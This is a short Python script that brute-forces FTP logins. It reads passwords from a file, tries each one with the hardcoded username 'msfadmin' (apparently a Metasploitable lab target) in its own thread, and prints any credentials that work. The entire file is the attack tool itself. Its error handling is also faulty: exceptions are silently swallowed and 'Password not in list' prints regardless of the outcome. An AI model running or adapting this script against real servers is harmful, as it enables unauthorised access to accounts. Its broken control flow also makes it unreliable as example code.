import ftplib
import sys
from threading import *


def ftpProbe(host, userName, passWord):
    try:
        ftp = ftplib.FTP(host)
        print("Trying (login/passowrd): " + userName + " / " + passWord)
        login = ftp.login(userName, passWord)
        print("Login Suceeded with: " + userName + "/" + passWord)
        ftp.quit()
        return(userName, passWord)
    except:
        exit

def ftpLogin(host, passwdFile):
    try:
        pF = open(passwdFile, "r")
    except:
        print(" No file .....")

    for line in pF.readlines():
        userName = "msfadmin"
        passWord = line.split(':')[0].strip('\n')
        t = Thread(target=ftpProbe, args=(host, userName, passWord))
        t.start()

    print("Password not in list")

host = str(sys.argv[1])
passwdFile = str(sys.argv[2])

ftpLogin(host, passwdFile)
